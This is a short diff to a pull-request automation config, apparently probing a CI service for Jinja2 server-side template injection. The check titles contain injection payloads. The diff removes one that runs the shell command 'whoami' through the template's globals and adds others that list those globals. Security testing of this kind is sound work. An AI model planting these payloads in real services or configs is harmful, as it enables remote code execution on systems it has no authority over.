@@ -6,9 +6,16 @@ pull_request_rules:
         title: "7*7={{ 7*7 }}"
         summary: ""
 
-  - name: ssti-rce
+  - name: ssti-globals
     conditions: []
     actions:
       post_check:
-        title: "{{ lipsum.__globals__['os'].popen('whoami').read() }}"
+        title: "{{ self.__init__.__globals__.keys() }}"
+        summary: ""
+
+  - name: ssti-cycler
+    conditions: []
+    actions:
+      post_check:
+        title: "{{ cycler.__init__.__globals__.keys() }}"
         summary: ""
